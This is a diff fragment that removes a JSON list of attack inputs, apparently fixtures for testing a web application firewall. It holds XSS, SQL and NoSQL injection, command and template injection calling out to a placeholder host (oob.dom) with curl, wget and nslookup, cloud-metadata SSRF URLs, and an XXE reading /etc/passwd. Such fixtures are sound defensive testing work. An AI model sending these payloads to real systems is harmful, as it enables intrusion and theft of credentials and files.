-          "constructor": {
-            "prototype": "something"
-          }
-        },
-        {
-          "query": "' | type %SystemRoot%\\\\win.ini | '"
-        },
-        {
-          "query": "\" | type %SystemDrive%\\\\boot.ini | \""
-        },
-        {
-          "query": "\" | type %SystemRoot%\\\\win.ini | \""
-        },
-        {
-          "query": "\"&type %SYSTEMROOT%\\win.ini&\""
-        },
-        {
-          "query": "'&type %SYSTEMROOT%\\win.ini&'"
-        },
-        {
-          "query": "http://webhook.site"
-        },
-        {
-          "query": "http://fingerprint.canarytokens.com"
-        },
-        {
-          "query": "https://act1on3.ru/i"
-        },
-        {
-          "query": "fingerprint.burp.gdsburp.com"
-        },
-        {
-          "query": "https://x.${hostname}.x.vii.one/s"
-        },
-        {
-          "param": " onabort=alert()"
-        },
-        {
-          "param": " onafterprint=alert()"
-        },
-        {
-          "param": " onanimationend=alert()"
-        },
-        {
-          "param": " onanimationiteration=alert()"
-        },
-        {
-          "param": " onanimationstart=alert()"
-        },
-        {
-          "param": " onbeforeprint=alert()"
-        },
-        {
-          "param": " onbeforeunload=alert()"
-        },
-        {
-          "param": " onblur=alert()"
-        },
-        {
-          "param": " oncanplay=alert()"
-        },
-        {
-          "param": " oncanplaythrough=alert()"
-        },
-        {
-          "param": " onchange=alert()"
-        },
-        {
-          "param": " onclick=alert()"
-        },
-        {
-          "param": " oncontextmenu=alert()"
-        },
-        {
-          "param": " oncopy=alert()"
-        },
-        {
-          "param": " oncut=alert()"
-        },
-        {
-          "param": " ondblclick=alert()"
-        },
-        {
-          "param": " ondrag=alert()"
-        },
-        {
-          "param": " ondragend=alert()"
-        },
-        {
-          "param": " ondragenter=alert()"
-        },
-        {
-          "param": " ondragleave=alert()"
-        },
-        {
-          "param": " ondragover=alert()"
-        },
-        {
-          "param": " ondragstart=alert()"
-        },
-        {
-          "param": " ondrop=alert()"
-        },
-        {
-          "param": " ondurationchange=alert()"
-        },
-        {
-          "param": " onended=alert()"
-        },
-        {
-          "param": " onerror=alert()"
-        },
-        {
-          "param": " onfocus=alert()"
-        },
-        {
-          "param": " onfocusin=alert()"
-        },
-        {
-          "param": " onfocusout=alert()"
-        },
-        {
-          "param": " onfullscreenchange=alert()"
-        },
-        {
-          "param": " onfullscreenerror=alert()"
-        },
-        {
-          "param": " onhashchange=alert()"
-        },
-        {
-          "param": " oninput=alert()"
-        },
-        {
-          "param": " oninvalid=alert()"
-        },
-        {
-          "param": " onkeydown=alert()"
-        },
-        {
-          "param": " onkeypress=alert()"
-        },
-        {
-          "param": " onkeyup=alert()"
-        },
-        {
-          "param": " onload=alert()"
-        },
-        {
-          "param": " onloadeddata=alert()"
-        },
-        {
-          "param": " onloadedmetadata=alert()"
-        },
-        {
-          "param": " onloadstart=alert()"
-        },
-        {
-          "param": " onmessage=alert()"
-        },
-        {
-          "param": " onmousedown=alert()"
-        },
-        {
-          "param": " onmouseenter=alert()"
-        },
-        {
-          "param": " onmouseleave=alert()"
-        },
-        {
-          "param": " onmousemove=alert()"
-        },
-        {
-          "param": " onmouseover=alert()"
-        },
-        {
-          "param": " onmouseout=alert()"
-        },
-        {
-          "param": " onmouseup=alert()"
-        },
-        {
-          "param": " onoffline=alert()"
-        },
-        {
-          "param": " ononline=alert()"
-        },
-        {
-          "param": " onpagehide=alert()"
-        },
-        {
-          "param": " onpageshow=alert()"
-        },
-        {
-          "param": " onpaste=alert()"
-        },
-        {
-          "param": " onpause=alert()"
-        },
-        {
-          "param": " onplay=alert()"
-        },
-        {
-          "param": " onplaying=alert()"
-        },
-        {
-          "param": " onprogress=alert()"
-        },
-        {
-          "param": " onratechange=alert()"
-        },
-        {
-          "param": " onresize=alert()"
-        },
-        {
-          "param": " onreset=alert()"
-        },
-        {
-          "param": " onscroll=alert()"
-        },
-        {
-          "param": " onsearch=alert()"
-        },
-        {
-          "param": " onseeked=alert()"
-        },
-        {
-          "param": " onseeking=alert()"
-        },
-        {
-          "param": " onselect=alert()"
-        },
-        {
-          "param": " onshow=alert()"
-        },
-        {
-          "param": " onstalled=alert()"
-        },
-        {
-          "param": " onsubmit=alert()"
-        },
-        {
-          "param": " onsuspend=alert()"
-        },
-        {
-          "param": " ontimeupdate=alert()"
-        },
-        {
-          "param": " ontoggle=alert()"
-        },
-        {
-          "param": " ontouchcancel=alert()"
-        },
-        {
-          "param": " ontouchend=alert()"
-        },
-        {
-          "param": " ontouchmove=alert()"
-        },
-        {
-          "param": " ontouchstart=alert()"
-        },
-        {
-          "param": " onunload=alert()"
-        },
-        {
-          "param": " onvolumechange=alert()"
-        },
-        {
-          "param": " onwaiting=alert()"
-        },
-        {
-          "param": " onwheel=alert()"
-        },
-        {
-          "param": "<img+src%3dx+onerror%3dalert(1)>"
-        },
-        {
-          "param": "<img+src=something+onauxclick=\"new+Function+`al\\ert\\`xss\\``\">"
-        },
-        {
-          "param": "<sVg+OnPointerEnter=\"location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div\">"
-        },
-        {
-          "param": "tarun\"><x/onafterscriptexecute=confirm%26lpar;)//"
-        },
-        {
-          "param": "bda4fd66-4084-4eff-81cd-475723758ffc AND 5996=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (5996=5996) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)))-- MOUo"
-        },
-        {
-          "param": "prompt(8)-"
-        },
-        {
-          "param": "prompt (8)-"
-        },
-        {
-          "param": "prompt+(8)-"
-        },
-        {
-          "param": "'-prompt(8)-'"
-        },
-        {
-          "q": "http://bla.nessus.org/nessus"
-        },
-        {
-          "__proto__": "something"
-        },
-        {
-          "q": "123@ptst.io@169.254.169.254/latest/meta-data/?123@ptst.io"
-        },
-        {
-          "$or": "bla"
-        },
-        {
-          "$or[0][masspush]": "bla"
-        },
-        {
-          "param": "file://0000::001/var/run/secrets/kubernetes.io/serviceaccount"
-        },
-        {
-          "param": "\\\\0::001\\c$\\windows\\win.ini"
-        },
-        {
-          "param": "\\\\::1\\c$\\users\\default\\ntuser.dat"
-        },
-        {
-          "param": "\\\\localhost\\c$\\windows\\win.ini"
-        },
-        {
-          "x": "cmd /V:OFF ping oob.dom"
-        },
-        {
-          "x": "$(y=oob.li;x=oob.dom;{ping,$x.$y})"
-        },
-        {
-          "x": "$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cmd.exe /C ping oob.dom')}"
-        },
-        {
-          "x": ";<?php echo `ping oob.dom`; ?>"
-        },
-        {
-          "x": "{{ 'ping oob.dom' | system }}"
-        },
-        {
-          "x": "{{ 'ping oob.dom' | shell_exec }}"
-        },
-        {
-          "x": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"ping oob.dom\")}}"
-        },
-        {
-          "x": "${'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"java.lang.Runtime.getRuntime().exec(\\\"cmd.exe /C \\\"ping oob.dom\\\"\\\")\")}"
-        },
-        {
-          "x": "`$(curl -Is oob.dom)`"
-        },
-        {
-          "x": ";COPY * from PROGRAM 'curl http://oob.dom/a.txt';--"
-        },
-        {
-          "x": ";<?php echo `ping oob.dom`; ?>"
-        },
-        {
-          "x": "dir2||curl -Is http://oob.dom"
-        },
-        {
-          "x": "/;{curl,http://oob.dom+-H+'User-Agent:+GbAAmA'};"
-        },
-        {
-          "x": ";curl oob.dom/`whoami`;"
-        },
-        {
-          "x": "$(wget http://oob.dom))"
-        },
-        {
-          "x": "sudo rpm --eval '%{lua:os.execute(\"wget http://oob.dom\")}'"
-        },
-        {
-          "x": "dir2||nslookup oob.dom"
-        },
-        {
-          "x": "&telnet oob.dom"
-        },
-        {
-          "x": "nslookup {domain}&"
-        },
-        {
-          "x": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 CIVAI&nslookup -q=cname oob.dom.&'\\\"`0&nslookup -q=cname oob.dom.&`'"
-        },
-        {
-          "query": "http://0xa9.0xfe.0xa9.0xfe/metadata/v1"
-        },
-        {
-          "query": "https://0xa9.0xfe.0xa9.0xfe/metadata/v1"
-        },
-        {
-          "query": "http://169.254.169.254/computeMetadata/v1beta1/instance"
-        },
-        {
-          "query": "http://ï»¿ï»¿0251.0376.0251.0376/metadata/v1"
-        },
-        {
-          "query": "http://0xa9fea9fe/computeMetadata/v1beta1/instance"
-        },
-        {
-          "query": "ï»¿ï»¿http://0xa9fea9fe/latest/meta-data/"
-        },
-        {
-          "query": "http://metadata.google.internal/computeMetadata/v1/instance"
-        },
-        {
-          "query": "http://0xA9FEa9fe/"
-        }
-      ],
-      "server.request.body": [
-        {
-          "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "value"
-        },
-        {
-          "Class.module.classLoader.resources.context.parent.pipeline.first.pattern": "value"
-        },
-        {
-          "xml": "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE attack [<!ENTITY a SYSTEM \"file:///etc/passwd\">]><attack>&a;</attack>"
-        }
-      ],
-      "server.response.status": [
-        "404"
-      ],
-      "waf.context.processor": [
-        {
-          "extract-schema": true
-        }
-      ]
-    }
   }
 }
